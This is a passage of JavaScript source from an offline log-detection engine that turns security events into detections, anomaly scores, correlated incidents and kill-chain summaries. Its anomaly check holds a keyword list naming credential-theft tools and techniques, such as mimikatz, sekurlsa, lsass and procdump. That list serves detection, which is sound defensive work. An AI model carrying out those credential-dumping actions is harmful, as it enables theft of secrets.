    // ── Build timeline entry from event ───────────────────────────
    // ── Build enriched timeline entry from event ─────────────────
    function _buildTimelineEntry(event, detId) {
      const e   = event; // already normalized
      const eid = parseInt(e.EventID, 10);

      // Use EventID enrichment dictionary for analyst-readable details
      const enriched = _enrichEventDetail(e);
      const type = enriched.category || 'event';
      const description = enriched.detail || `EVENT ${isNaN(eid)?'?':eid}: ${e.computer||''}`;

      return {
        ts          : e.timestamp,
        timestamp   : e.timestamp,
        type,
        description,
        enriched    : enriched.enriched,
        label       : enriched.label,
        icon        : enriched.icon,
        entity      : e.computer || e.user || '',
        commandLine : e.commandLine || '',
        eventId     : isNaN(eid) ? null : eid,
        user        : e.user,
        computer    : e.computer,
        srcIp       : e.srcIp,
        destIp      : e.destIp || '',
        destPort    : e.destPort || '',
        process     : e.process || '',
        logSource   : e._logSource || '',
        linkedEvents: e._linkedEventIds ? e._linkedEventIds.length : 0,
        detection   : detId || null,
      };
    }

    // ── Build UEBA anomalies ─────────────────────────────────────
    function _buildAnomalies(events, dedupedDets) {
      const anomalies = [];

      // Authentication failure rate per user (O(n))
      const authFails = new Map();
      events.forEach(e => {
        if (parseInt(e.EventID,10) === 4625) {
          const u = e.user || '?';
          if (!authFails.has(u)) authFails.set(u, []);
          authFails.get(u).push(e);
        }
      });
      authFails.forEach((evts, user) => {
        if (evts.length >= 2) {
          anomalies.push({
            id: `UEBA-BF-${user}`,
            type: 'authentication_anomaly',
            description: `Abnormal authentication failure rate for "${user}" — ${evts.length} failures`,
            entity: user,
            score: Math.min(0.4 + evts.length * 0.15, 0.99),
            baseline: 0, observed: evts.length, deviation: evts.length * 100,
            timestamp: evts[0].timestamp,
          });
        }
      });

      // Suspicious command-line patterns (O(n))
      const suspCmds = events.filter(e => {
        const cmd = (e.commandLine||'').toLowerCase();
        return cmd.includes('/add') || cmd.includes('hacker') || cmd.includes('p@ss') ||
               cmd.includes('shadow') || cmd.includes('sekurlsa') || cmd.includes('mimikatz') ||
               cmd.includes('-enc') || cmd.includes('lsass') || cmd.includes('procdump');
      });
      if (suspCmds.length) {
        anomalies.push({
          id: 'UEBA-PROC-001',
          type: 'process_anomaly',
          description: `Suspicious command-line patterns detected — ${suspCmds.length} process event(s)`,
          entity: suspCmds[0].computer || 'DC01',
          score: Math.min(0.5 + suspCmds.length * 0.1, 0.99),
          baseline: 0, observed: suspCmds.length, deviation: suspCmds.length * 1000,
          timestamp: suspCmds[0].timestamp,
        });
      }

      // Off-hours activity heuristic
      const offHours = events.filter(e => {
        try {
          const h = new Date(e.timestamp).getHours();
          return h < 6 || h > 22;
        } catch { return false; }
      });
      if (offHours.length >= 2) {
        anomalies.push({
          id: 'UEBA-OFH-001',
          type: 'off_hours_activity',
          description: `${offHours.length} events observed outside business hours (before 06:00 or after 22:00)`,
          entity: offHours[0].computer || offHours[0].user || 'unknown',
          score: Math.min(0.35 + offHours.length * 0.05, 0.95),
          baseline: 0, observed: offHours.length, deviation: offHours.length * 500,
          timestamp: offHours[0].timestamp,
        });
      }

      return anomalies;
    }

    // ── Risk score from deduplicated detections ──────────────────
    function _calcRisk(dets) {
      if (!dets.length) return 0;
      const criticals = dets.filter(d => d.aggregated_severity === 'critical' || d.severity === 'critical').length;
      const highs     = dets.filter(d => d.aggregated_severity === 'high'     || d.severity === 'high').length;
      const mediums   = dets.filter(d => d.aggregated_severity === 'medium'   || d.severity === 'medium').length;
      return Math.min(criticals * 30 + highs * 15 + mediums * 5, 100);
    }

    // ════════════════════════════════════════════════════════════════
    //  MAIN: analyzeEvents — complete offline detection pipeline
    //  Complexity: O(n log n) — dominated by sort steps
    //  Memory: O(n) — no quadratic data structures
    //  @param {Array}  rawEvents
    //  @param {Object} opts — { dedupWindowMs, minBruteForce }
    //  @returns {Object}
    // ════════════════════════════════════════════════════════════════
    function analyzeEvents(rawEvents, opts) {
      opts = opts || {};
      if (opts.dedupWindowMs) CFG.DEDUP_WINDOW_MS = opts.dedupWindowMs;
      if (opts.minBruteForce) CFG.MIN_BRUTE_FORCE_COUNT = opts.minBruteForce;

      const events   = rawEvents.map(_normalizeEvent);
      const rawDets  = [];
      const timeline = [];
      const sessionId = 'CSDE-' + Math.random().toString(36).slice(2,10).toUpperCase();
      const startTs  = Date.now();

      // ── Cross-Log Linking: build PID/identity adjacency BEFORE rule eval ─
      // Decorates each event with _linkedEventIds, _logSource, _hostKey, _pid, _tsMs
      _crossLinkEvents(events);
      let schemaSkipped = 0; // counter for schema gate misses

      // ── Per-event rule matching (O(n × rules)) ─────────────────
      events.forEach((event, idx) => {
        timeline.push(_buildTimelineEntry(event, null));

        RULES.forEach(rule => {
          if (rule.matchBatch) return; // batch handled separately
          if (!_osMatch(rule, event)) return;

          // ── Schema-First Validation Gate ───────────────────────
          // Skip this rule entirely if the event does not match the
          // rule's declared log category (wrong EventID range, wrong OS,
          // missing required fields, or forbidden fields present).
          if (!_validateEventSchema(rule, event)) {
            schemaSkipped++;
            return;
          }

          try {
            if (!rule.match(event)) return;

            // ── SOC v5: False-Positive Suppression Gate ────────────
            const fpCheck = _checkFPSuppression(event, rule.id);
            if (fpCheck.suppressed) {
              // Skip known-safe FP pattern entirely
              return;
            }
            const inMaintWindow = fpCheck.inMaintenanceWindow &&
                                  (rule.severity === 'low' || rule.severity === 'informational');
            if (inMaintWindow) return; // suppress low/info in maintenance window

            // Check all variant sub-rules to label which variant fired
            let variantId = rule.id;
            if (rule.variants) {
              const fired = rule.variants.find(v => { try { return v.match(event); } catch { return false; } });
              if (fired) variantId = fired.id;
            }
            // ── Enrich event with analyst-readable detail ───────────
            const eventEnrichment = _enrichEventDetail(event);
            const det = {
              id         : `${variantId}-${idx}`,
              ruleId     : rule.id,
              variantId,
              ruleName   : rule.title,
              title      : rule.title,
              detection_name: rule.title,
              severity   : rule.severity,
              computer   : event.computer || '',
              host       : event.computer || '',
              user       : event.user || '',
              srcIp      : event.srcIp || '',
              commandLine: event.commandLine || '',
              process    : event.process || '',
              mitre      : rule.mitre,
              // Full MITRE role object for child events
              mitreDetail: {
                technique : rule.mitre?.technique || '',
                name      : rule.mitre?.name || '',
                tactic    : rule.mitre?.tactic || '',
                confidence: 70, // single-event detection baseline
                role      : 'primary',
              },
              technique  : rule.mitre?.technique,
              tags       : rule.tags || [],
              riskScore  : rule.riskScore,
              evidence   : [event],
              eventEnrichment,
              narrative  : rule.narrative ? rule.narrative(event) : rule.title,
              timestamp  : event.timestamp,
              first_seen : event.timestamp,
              last_seen  : event.timestamp,
              category   : rule.category,
              logCategory: rule.logCategory || null,
              // Enrich detection with cross-log link info
              linkedEvents: event._linkedEventIds && event._linkedEventIds.length
                ? event._linkedEventIds.map(li => ({
                    idx: li,
                    EventID: events[li]?.EventID,
                    logSource: events[li]?._logSource,
                    host: events[li]?.computer || '',
                    user: events[li]?.user || '',
                    timestamp: events[li]?.timestamp || '',
                    enriched: _enrichEventDetail(events[li] || {}),
                  }))
                : [],
            };
            rawDets.push(det);
            if (timeline[idx]) {
              timeline[idx].detection = det.id;
              timeline[idx].ruleId    = rule.id;
              timeline[idx].severity  = rule.severity;
            }
          } catch { /* skip */ }
        });
      });

      // ── Batch rule matching (O(n) per batch rule) ───────────────
      RULES.filter(r => r.matchBatch).forEach(rule => {
        // OS filter: check at least one event matches OS
        const eligible = events.filter(e => _osMatch(rule, e) && _validateEventSchema(rule, e));
        if (!eligible.length) return;
        try {
          const results = rule.matchBatch(eligible);
          if (results && results.length) {
            results.forEach(d => {
              // Prevent exact duplicate (same ruleId + user already from per-event run)
              if (!rawDets.find(x => x.ruleId === d.ruleId && x.user === d.user)) {
                rawDets.push({ ...d, variantId: d.id || d.ruleId });
              }
            });
          }
        } catch { /* skip */ }
      });

      // ── Supersession: drop lower-confidence per-event detections ─
      // If a batch rule fired for same user, drop individual per-event matches
      // FIX v7: Added spray/stuffing supersession; CSDE-WIN-025/026 supersede
      // individual CSDE-WIN-001 logon-failure events (no duplicate spam).
      const supersedeMap = {
        'CSDE-WIN-001': 'CSDE-WIN-002', // individual fail → superseded by batch brute force
        'CSDE-WIN-006': 'CSDE-WIN-003', // generic logon  → superseded by brute force success
      };
      // Additional: if CSDE-WIN-025 (spray) or CSDE-WIN-026 (stuffing) fired,
      // suppress CSDE-WIN-002 (per-user brute-force) for overlapping source IPs
      const sprayDets   = rawDets.filter(d => d.ruleId === 'CSDE-WIN-025');
      const stuffDets   = rawDets.filter(d => d.ruleId === 'CSDE-WIN-026');
      const sprayIps    = new Set(sprayDets.map(d => d.srcIp).filter(Boolean));
      const hasStuffing = stuffDets.length > 0;

      const filteredDets = rawDets.filter(d => {
        const superseder = supersedeMap[d.ruleId];
        if (superseder) {
          // Supersede if a better rule fired for the same user OR same host+srcIp
          const betterExists = rawDets.some(b =>
            b.ruleId === superseder &&
            (b.user === d.user ||
             (b.computer === d.computer && b.srcIp && b.srcIp === d.srcIp))
          );
          if (betterExists) return false;
        }
        // Suppress individual CSDE-WIN-001 events when spray/stuffing covers them
        if (d.ruleId === 'CSDE-WIN-001' && sprayIps.has(d.srcIp)) return false;
        if (d.ruleId === 'CSDE-WIN-001' && hasStuffing) return false;
        // Suppress brute-force (per-user) when spray already covers same IP
        if (d.ruleId === 'CSDE-WIN-002' && sprayIps.has(d.srcIp)) return false;
        return true;
      });

      // ── DEDUPLICATION ─────────────────────────────────────────────
      const dedupedDets = _dedupDetections(filteredDets);

      // ── Temporal-Identity Correlation (60-second window) ──────────
      // Groups deduplicated alerts by host+user within 60 s into Incidents
      const correlationResult = _correlateIncidents(dedupedDets);
      const incidents          = correlationResult.incidents;
      // Tag each detection with incident metadata (already done inside _correlateIncidents)

      // ── Attack chains (from deduplicated detections) ───────────
      const chains = _buildAttackChain(dedupedDets, events);

      // ── UEBA anomalies ─────────────────────────────────────────
      const anomalies = _buildAnomalies(events, dedupedDets);

      // ── Risk score ────────────────────────────────────────────
      const riskScore = _calcRisk(dedupedDets);

      const duration = Date.now() - startTs;

      console.log(
        `[CSDE v8] ${events.length} events → ${rawDets.length} raw → ${dedupedDets.length} deduped, ` +
        `${incidents.length} incidents, ${chains.length} chains, risk=${riskScore} ` +
        `(schema_skipped=${schemaSkipped}, ${duration}ms, engine=v10-BCE-Hardened)`
      );

      // ════════════════════════════════════════════════════════════
      //  BCE v10 — ENRICHED INCIDENT SUMMARY BUILDER
      //  Transforms each correlated incident into a fully-structured
      //  analyst output with:
      //    • Ordered kill-chain stages (observed + inferred)
      //    • Per-stage confidence, inferred flag, tactic role label
      //    • Aggregated chain risk score (progressive, depth-aware)
      //    • MITRE tactic/technique per stage (never empty)
      //    • Chain integrity assessment (valid/invalid + violations)
      //    • Timeline graph data for UI visualization
      // ════════════════════════════════════════════════════════════
      const confidenceSummary = incidents.map(inc => {
        const phaseTimeline    = inc.phaseTimeline || [];
        const causalViolations = inc.dag?.causalViolations || [];
        const chainValid       = causalViolations.length === 0;
        const allDetections    = inc.all || [inc.parent, ...(inc.children||[])].filter(Boolean);

        // ── Build ordered kill-chain stages (observed + inferred) ───
        // Pull from phaseTimeline (which contains ALL stages incl inferred)
        const killChainStages = phaseTimeline.map((p, si) => {
          const isInferred = !!(p.inferred || p.inferredFrom);
          return {
            stageIndex        : p.stageIndex ?? si,
            phase             : p.phase,
            tacticRole        : p.phaseTactic || p.tactic || p.phase || 'unknown',
            tactic            : p.phaseTactic || p.tactic || p.phase || 'unknown',
            technique         : p.technique   || '',
            techniqueName     : p.techniqueName || '',
            ruleId            : p.ruleId       || (isInferred ? `BCE-INFER-${si}` : ''),
            ruleName          : p.ruleName     || p.name || '',
            host              : p.host         || '',
            user              : p.user         || '',
            timestamp         : p.timestamp    || p.first_seen || '',
            first_seen        : p.first_seen   || p.timestamp  || '',
            last_seen         : p.last_seen    || p.first_seen || p.timestamp || '',
            duration_ms       : p.duration_ms  || 0,
            severity          : p.severity     || 'medium',
            // Per-stage confidence (inferred stages get their own score)
            confidence        : isInferred
                                  ? (p.inferredConfidence || CFG.BCE_INFER_CONFIDENCE_BASE)
                                  : (p.confidence ?? (p.riskScore || 30)),
            // Observed vs inferred
            inferred          : isInferred,
            inferredFrom      : p.inferredFrom || null,
            inferredConfidence: isInferred ? (p.inferredConfidence || CFG.BCE_INFER_CONFIDENCE_BASE) : null,
            // Causal chain metadata
            causalEdges       : p.causalEdges || [],
            hasCausalViolation: !!(p.hasCausalViolation),
            isHostTransition  : !!(p.isHostTransition),
            // Evidence
            rawEvidenceLogs   : p.rawEvidenceLogs || [],
            narrative         : p.narrative   || '',
            commandLine       : p.commandLine || '',
            process           : p.process     || '',
            srcIp             : p.srcIp       || '',
            // Attack chain visualization hints
            _nodeType         : isInferred ? 'inferred' : 'observed',
            _riskScore        : p.riskScore  || 0,
          };
        });

        // ── Compute aggregated progressive risk (BCE chain-aware) ───
        const observed       = allDetections.filter(d => !d.inferred);
        const crossHostDetect= (inc.allHosts || []).length > 1;
        const progressiveRisk= _computeProgressiveRisk(observed.length ? observed : allDetections, crossHostDetect);

        // ── Build chain visualization graph data ──────────────────
        // Each node has position hints for the UI SVG graph
        // Synthesize edges from causalEdges in phaseTimeline
        const synthEdges = [];
        killChainStages.forEach((s, si) => {
          const causalEdges = phaseTimeline[si]?.causalEdges || [];
          causalEdges.forEach(ce => {
            // Find the target stage index by matching edgeType
            for (let ti = si + 1; ti < killChainStages.length; ti++) {
              synthEdges.push({ from: si, to: ti, valid: !s.hasCausalViolation, gap_ms: ce.gap_ms || 0 });
              break; // only add the immediate next edge
            }
          });
          // Fallback: add sequential edges if no causal edges defined
          if (!causalEdges.length && si < killChainStages.length - 1) {
            synthEdges.push({ from: si, to: si + 1, valid: true, gap_ms: 0 });
          }
        });
        // Also pull edges from the dag object (in case they're stored in the raw incident)
        const dagEdgesRaw = (inc.dag?.edges || []);
        const finalEdges = dagEdgesRaw.length > 0
          ? dagEdgesRaw.map(e => ({ from: e.from, to: e.to, valid: e.valid !== false, gap_ms: e.gap_ms || 0 }))
          : synthEdges;

        const chainGraph = {
          nodes: killChainStages.map((s, ni) => ({
            id      : `node-${ni}`,
            index   : ni,
            label   : s.ruleName || s.technique || `Stage ${ni+1}`,
            tactic  : s.tactic,
            technique: s.technique,
            severity: s.severity,
            confidence: s.confidence,
            inferred: s.inferred,
            host    : s.host,
            riskScore: s._riskScore,
          })),
          edges: finalEdges,
          causalViolations,
          isValid: chainValid,
        };

        // ── Root-cause / intent summary ────────────────────────────
        const intentSignals   = inc.intentSignals || {};
        const dominantIntent  = intentSignals.attackerCount > 0 ? 'attacker' : 'admin';
        const rootCauseSummary= inc.behavior?.description
          || (killChainStages[0]?.narrative ? `Attack initiated via: ${killChainStages[0].narrative.slice(0,120)}` : null)
          || `${killChainStages.length}-stage attack chain by ${inc.user || 'unknown user'} on ${(inc.allHosts||[inc.host]).join(', ')}`;

        return {
          // ── Identifiers ────────────────────────────────────────────
          id               : inc.id || inc.incidentId,
          incidentId       : inc.incidentId,
          attackChainId    : inc.incidentId,
          title            : inc.title,
          // ── Confidence & Scoring ───────────────────────────────────
          confidence       : inc.confidence?.score || 0,
          level            : inc.confidence?.level || 'Possible',
          // ── Behavior ──────────────────────────────────────────────
          behaviorId       : inc.behavior?.behaviorId  || 'generic',
          behaviorTitle    : inc.behavior?.behaviorTitle || '',
          duration         : inc.durationLabel,
          duration_ms      : inc.duration_ms || 0,
          // ── Verdict ────────────────────────────────────────────────
          verdict          : inc.verdict || 'PARTIAL',
          verdictReason    : inc.verdictReason || '',
          // ── Priority ───────────────────────────────────────────────
          p1Priority       : inc.p1Priority || false,
          logTampering     : inc.logTamperingDetected || false,
          // ── Severity ───────────────────────────────────────────────
          severity         : inc.severity,
          riskScore        : inc.riskScore,
          // Progressive risk (chain-aware, depth-weighted)
          progressiveRisk,
          // ── MITRE ──────────────────────────────────────────────────
          mitreTactics     : inc.mitreTactics || [],
          techniques       : inc.techniques   || [],
          mitreMappings    : inc.mitreMappings || [],
          // ── Scope ──────────────────────────────────────────────────
          host             : inc.host,
          user             : inc.user,
          allHosts         : inc.allHosts  || [],
          allUsers         : inc.allUsers  || [],
          allSrcIps        : inc.allSrcIps || [],
          crossHost        : inc.crossHost || false,
          // ── Timestamps ─────────────────────────────────────────────
          first_seen       : inc.first_seen,
          last_seen        : inc.last_seen,
          // ── Ordered kill-chain stages (multi-stage, observed+inferred) ─
          killChainStages,
          stageCount       : killChainStages.length,
          observedStages   : killChainStages.filter(s => !s.inferred).length,
          inferredStages   : killChainStages.filter(s =>  s.inferred).length,
          hasInferredStages: killChainStages.some(s => s.inferred),
          // ── Chain visualization graph ──────────────────────────────
          chainGraph,
          // ── Chain validity ─────────────────────────────────────────
          chainValid,
          causalViolations,
          phaseSequence    : inc.dag?.phaseSequence || [],
          // ── Intent / root cause ────────────────────────────────────
          dominantIntent,
          rootCauseSummary,
          intentSignals    : inc.intentSignals || {},
          // ── Evidence ───────────────────────────────────────────────
          detectionCount   : inc.detectionCount || 0,
          // ── Narrative ─────────────────────────────────────────────
          narrative        : inc.narrative || '',
          aceScore         : inc.aceScore  || {},
        };
      });

      // Summary: P1 alerts that need immediate action
      const p1Incidents    = incidents.filter(i => i.p1Priority);
      const logTamperCount = incidents.filter(i => i.logTamperingDetected).length;
      const truePositives  = incidents.filter(i => i.verdict === 'TRUE_POSITIVE').length;
      const falsePositives = incidents.filter(i => i.verdict === 'FALSE_POSITIVE').length;

      return {
        success  : true,
        sessionId, processed: events.length,
        detections: dedupedDets,
        incidents,
        timeline,
        chains,
        anomalies,
        riskScore,
        duration,
        engine   : 'CSDE-offline',
        // SOC-grade output
        p1Incidents,
        logTamperingDetected: logTamperCount > 0,
        verdictSummary: {
          truePositives,
          falsePositives,
          partial: incidents.length - truePositives - falsePositives,
          total  : incidents.length,
        },
        // Full SOC-ready incident summaries (primary analyst output)
        incidentSummaries: confidenceSummary,
        _meta: {
          rulesEvaluated    : RULES.length,
          rawDetections     : rawDets.length,
          dedupedDetections : dedupedDets.length,
          incidentsFormed   : incidents.length,
          schemaSkipped,
          eventsAnalyzed    : events.length,
          dedupWindowMs     : CFG.DEDUP_WINDOW_MS,
          correlWindowMs    : CORR_WINDOW_MS,
          engineVersion     : 'CSDE-v10-BCE-Hardened',
          fpSuppressed      : rawDets.filter(d => d._fpSuppressed).length,
          p1Count           : p1Incidents.length,
          logTamperCount,
          truePositives,
          falsePositives,
          confidenceSummary,
          // Chain validity summary
          validChains   : chains.filter(c => c.chainValid).length,
          invalidChains : chains.filter(c => !c.chainValid).length,
          totalCausalViolations: chains.reduce((s, c) => s + (c.causalViolations?.length || 0), 0),
          // BCE v10 chain stats
          totalInferredStages: confidenceSummary.reduce((s,i) => s + (i.inferredStages||0), 0),
          totalObservedStages: confidenceSummary.reduce((s,i) => s + (i.observedStages||0), 0),
        },
      };
    }

    // ── Global state deduplication (cross-analysis) ──────────────
    // Merges new deduplicated detections into an existing array,
    // collapsing duplicates across multiple analyses.
    // Works with BOTH CSDE-format AGG detections AND raw backend detections.
    function mergeDetections(existing, incoming) {
      // Normalize incoming detections to CSDE format before merging
      const normalizedIncoming = incoming.map(_normalizeExternalDet);
      const normalizedExisting = existing.map(_normalizeExternalDet);
      const combined = [...normalizedExisting, ...normalizedIncoming];
      return _dedupDetections(combined);
    }

    // ── Normalize external/backend detection to CSDE format ──────
    // Ensures ruleId, severity, detection_name etc. are present
    // so _dedupDetections can properly bucket them.
    // ── OS inference from detection title/ruleName ───────────────────
    // Returns 'windows' | 'linux' | 'unknown' based on rule title keywords
    function _inferOsFromTitle(title) {
      const t = String(title || '').toLowerCase();
      // Explicit OS labels in title
      if (/\blinux\b|\bsyslog\b|\bauditd\b|\bsudo\b|cron\s*job|systemd|\bssh\b brute|pam_unix/.test(t)) return 'linux';
      if (/\bwindows\b|win\s+security|win\s+sysmon|eventid\s+\d{4}|powershell|wmi\b|lsass|sam\s+dump|ntds/.test(t)) return 'windows';
      if (/hayabusa.*sysmon|sysmon\s+event/i.test(t)) return 'windows';
      return 'unknown';
    }

    // ── Determine if a detection's OS matches the event OS ────────────
    // Used to filter backend detections that are cross-OS mismatches
    function _detOsMatchesEvents(det, eventsOs) {
      if (eventsOs === 'unknown') return true; // can't determine, keep
      const detOs = _inferOsFromTitle(det.detection_name || det.title || det.ruleName || '');
      if (detOs === 'unknown') return true; // can't determine, keep
      return detOs === eventsOs;
    }

    function _normalizeExternalDet(det) {
      if (!det || typeof det !== 'object') return det;
      // If already a CSDE AGG detection, return as-is
      if (det.id && String(det.id).startsWith('AGG-')) return det;

      const out = { ...det };
      // Canonical ruleId: prefer ruleId, then rule_id, then slug from title
      if (!out.ruleId) {
        out.ruleId = out.rule_id || out.ruleID ||
          (out.title || out.ruleName || out.detection_name || '');
      }
      // Canonical display name
      if (!out.detection_name) {
        out.detection_name = _normalizeRuleName(out.ruleName || out.title || out.ruleId || '');
      }
      if (!out.ruleName) out.ruleName = out.detection_name;
      if (!out.title) out.title = out.detection_name;

      // Severity normalization
      const sevMap = { 0: 'informational', 1: 'low', 2: 'medium', 3: 'high', 4: 'critical',
                       'info': 'informational', 'warn': 'low', 'warning': 'medium',
                       'error': 'high', 'critical': 'critical' };
      const rawSev = String(out.severity || out.level || 'medium').toLowerCase();
      out.severity = sevMap[rawSev] || rawSev || 'medium';
      if (!out.aggregated_severity) out.aggregated_severity = out.severity;

      // Ensure event_count
      if (!out.event_count) {
        out.event_count = out.count || (Array.isArray(out.evidence) ? out.evidence.length : 1);
      }

      // Ensure timestamps
      out.timestamp  = out.timestamp  || out.first_seen  || out.TimeGenerated || out.time || new Date().toISOString();
      out.first_seen = out.first_seen || out.timestamp;
      out.last_seen  = out.last_seen  || out.timestamp;

      // Ensure variants_triggered array
      if (!Array.isArray(out.variants_triggered)) {
        out.variants_triggered = out.variantId ? [out.variantId] : [];
      }

      // Ensure raw_detections array
      if (!Array.isArray(out.raw_detections)) {
        out.raw_detections = [];
      }

      // Host/computer normalization
      out.computer = out.computer || out.host || out.hostname || out.Computer || '';
      out.host     = out.computer;
      out.user     = out.user || out.User || out.username || '';

      // ── MITRE technique extraction ──────────────────────────────────
      // Backend may encode MITRE in different shapes: extract properly
      if (!out.mitre || !out.mitre.technique) {
        const rawMitre = out.mitre || out.mitre_technique || out.technique_id || out.attack || '';
        if (typeof rawMitre === 'string' && rawMitre.match(/T\d{4}/)) {
          out.mitre = { technique: rawMitre.match(/T\d{4}(\.\d{3})?/)?.[0] || rawMitre, name: out.mitre_name || '', tactic: out.tactic || '' };
        } else if (typeof rawMitre === 'object' && rawMitre !== null) {
          out.mitre = {
            technique: rawMitre.technique || rawMitre.technique_id || rawMitre.id || '',
            name: rawMitre.name || rawMitre.technique_name || '',
            tactic: rawMitre.tactic || rawMitre.tactic_id || '',
          };
        } else if (!out.mitre) {
          out.mitre = { technique: '', name: '', tactic: '' };
        }
      }
      // Also set flat technique field for template rendering
      if (!out.technique) out.technique = out.mitre?.technique || '';

      return out;
    }

    // ════════════════════════════════════════════════════════════════
    //  SMART BACKEND-RESULT PROCESSOR
    //  When the backend returns an inflated detection list (Hayabusa/Sigma
    //  firing one match per event-rule pair), this function:
    //   1. Normalizes all detections to CSDE format
    //   2. Filters OS mismatches (Linux rules on Windows events)
    //   3. Groups by canonical title slug (not just ruleId)
    //   4. Limits to the TOP_K most significant detections
    //   5. Merges with CSDE-generated detections for cross-validation
    //
    //  This produces a human-readable result instead of 400+ raw matches.
    // ════════════════════════════════════════════════════════════════
    const TOP_K_BACKEND_DETS = 30; // max backend detections before aggressive dedup

    function processBackendResult(backendResult, rawEvents) {
      const rawDets = normalizeDetections_inner(backendResult.detections);

      // ── Step 1: Determine OS of uploaded events ───────────────────
      const eventsOs = _inferEventsOs(rawEvents);

      // ── Step 2: Normalize + OS filter ────────────────────────────
      const normalized = rawDets
        .map(_normalizeExternalDet)
        .filter(d => _detOsMatchesEvents(d, eventsOs));

      // ── Step 3: Aggressive backend dedup by rule title only ───────
      // Backend (Hayabusa/Sigma) fires one match per event-rule pair, so we get:
      //   "Hidden Window Detection" × WS01/j.doe × WS01/SYSTEM × DC01/j.doe … = 6 entries
      // We collapse ALL occurrences of the same rule into ONE detection,
      // accumulating total event_count and all affected hosts.
      // Key = canonical rule slug (no host, no user) — unique per rule
      const titleBuckets = new Map();
      normalized.forEach(det => {
        const slug = _canonicalSlug(det);
        const sev  = det.severity || det.aggregated_severity || 'medium';
        if (!titleBuckets.has(slug)) {
          // Promote: pick the most severe instance as the representative detection
          titleBuckets.set(slug, { ...det, _hostsAffected: new Set([det.computer || det.host || '']), _usersAffected: new Set([det.user || '']) });
        } else {
          const agg = titleBuckets.get(slug);
          agg.event_count = (agg.event_count || 1) + (det.event_count || 1);
          if (det.computer || det.host) agg._hostsAffected.add(det.computer || det.host);
          if (det.user) agg._usersAffected.add(det.user);
          // Escalate severity
          if ((SEV_WEIGHT[sev] || 0) > (SEV_WEIGHT[agg.aggregated_severity] || 0)) {
            agg.aggregated_severity = sev;
            agg.severity = sev;
          }
        }
      });

      // Flatten title buckets; add hosts_affected summary
      const backendDeduped = Array.from(titleBuckets.values()).map(d => {
        const hosts = Array.from(d._hostsAffected).filter(Boolean);
        const users = Array.from(d._usersAffected).filter(Boolean);
        delete d._hostsAffected;
        delete d._usersAffected;
        // Build representative host/user from all affected
        d.computer  = hosts.join(', ') || d.computer || '';
        d.host      = d.computer;
        d.user      = users.join(', ') || d.user || '';
        d.hosts_affected = hosts;
        d.users_affected = users;
        // Ensure confidence score
        if (!d.confidence_score) {
          const cnt = d.event_count || 1;
          d.confidence_score = Math.round(30 + Math.min(Math.log2(cnt + 1) / Math.log2(16), 1.0) * 70);
        }
        return d;
      });

      // ── Step 4: Run CSDE on the same events ───────────────────────
      // CSDE is authoritative (OS-aware, behavioral rules, low false-positive)
      const csdeResult = analyzeEvents(rawEvents, { dedupWindowMs: 300_000 });

      // ── Step 5: CSDE wins; backend fills gaps for rules CSDE lacks ─
      // Create a set of rule slugs CSDE already detected
      const csdeSlugSet = new Set(csdeResult.detections.map(d => _canonicalSlug(d)));

      // Also build a content-semantic dedup set: any backend rule that conceptually
      // overlaps a CSDE detection (e.g., "Hayabusa: Sysmon EventID 1" is too generic)
      // We only include backend detections that are SPECIFIC and significant
      const GENERIC_RULE_PATTERNS = [
        /hayabusa.*sysmon\s+eventid/i,       // Hayabusa: Sysmon EventID 1 — too generic
        /win\s+security.*eventid\s+\d{4}/i,  // Win Security: EventID 4688 — too generic
        /eventid\s+\d{4}\s*[–-]/i,           // EventID 4688 — New Process: too generic
        /^sysmon\s+event/i,                   // Sysmon Event — too generic
        /network\s+device\s+cli/i,            // Network Device CLI — irrelevant for Windows hosts
        /replication.*removable\s+media/i,    // Removable Media — low signal
        /external\s+remote\s+services/i,      // External Remote Services — low specificity
      ];
      const isGenericRule = (name) => GENERIC_RULE_PATTERNS.some(p => p.test(name));

      // Build semantic keyword set from CSDE detections for overlap detection
      // "Shadow Copy Deletion (Ransomware Indicator)" → keywords: ['shadow', 'copy', 'deletion']
      const csdeKeywords = new Set();
      csdeResult.detections.forEach(d => {
        const name = (d.detection_name || d.ruleName || '').toLowerCase();
        // Extract meaningful keywords (skip common words)
        name.split(/[\s\-\/\(\)]+/).filter(w => w.length > 4).forEach(w => csdeKeywords.add(w));
      });

      const backendExtras = backendDeduped.filter(d => {
        const slug = _canonicalSlug(d);
        const name = (d.detection_name || d.title || '').toLowerCase();
        const sev  = d.aggregated_severity || d.severity || 'low';
        // Skip if CSDE already covers this rule (exact slug match)
        if (csdeSlugSet.has(slug)) return false;
        // Skip generic/noisy rules
        if (isGenericRule(name)) return false;
        // Skip if semantic overlap with CSDE detection
        // (e.g., backend "Shadow Copy Deletion" overlaps CSDE "Shadow Copy Deletion (Ransomware Indicator)")
        const nameWords = name.split(/[\s\-\/\(\)]+/).filter(w => w.length > 4);
        const overlapCount = nameWords.filter(w => csdeKeywords.has(w)).length;
        if (overlapCount >= 2) return false; // 2+ keyword overlap = duplicate concept
        // Only include high/critical backend extras
        return ['critical', 'high'].includes(sev);
      });

      // ── Step 6: Build final result ─────────────────────────────
      const combined = _dedupDetections([
        ...csdeResult.detections,
        ...backendExtras,
      ]);

      const rawCount     = rawDets.length;
      const dedupedCount = combined.length;

      return {
        ...backendResult,
        detections: combined,
        incidents : csdeResult.incidents || [],
        timeline  : csdeResult.timeline.length ? csdeResult.timeline : normalizeDetections_inner(backendResult.timeline),
        chains    : csdeResult.chains.length   ? csdeResult.chains   : normalizeDetections_inner(backendResult.chains),
        anomalies : csdeResult.anomalies.length ? csdeResult.anomalies : normalizeDetections_inner(backendResult.anomalies),
        riskScore : Math.max(csdeResult.riskScore, backendResult.riskScore || 0),
        engine    : 'CSDE+Backend',
        _meta: {
          ...(backendResult._meta || {}),
          rawDetections      : rawCount,
          backendRaw         : rawCount,
          csdeDetections     : csdeResult.detections.length,
          backendDeduped     : backendDeduped.length,
          backendExtraAdded  : backendExtras.length,
          dedupedDetections  : dedupedCount,
          eventsAnalyzed     : rawEvents.length,
          eventsOs,
          osMismatchFiltered : rawDets.length - normalized.length,
          dedupWindowMs      : 300_000,
        },
      };
    }

    // Helper: determine dominant OS across a batch of raw events
    function _inferEventsOs(events) {
      const counts = { windows: 0, linux: 0, unknown: 0 };
      events.forEach(e => {
        const os = _detectOS(Object.assign({}, e,
          { commandLine: e.CommandLine || e.commandLine || '',
            process: e.NewProcessName || e.ProcessName || e.process || '' }));
        counts[os]++;
      });
      if (counts.windows > counts.linux) return 'windows';
      if (counts.linux > counts.windows) return 'linux';
      return 'unknown';
    }

    // Inner helper to not conflict with outer normalizeDetections
    function normalizeDetections_inner(input) {
      if (input == null) return [];
      if (Array.isArray(input)) return input;
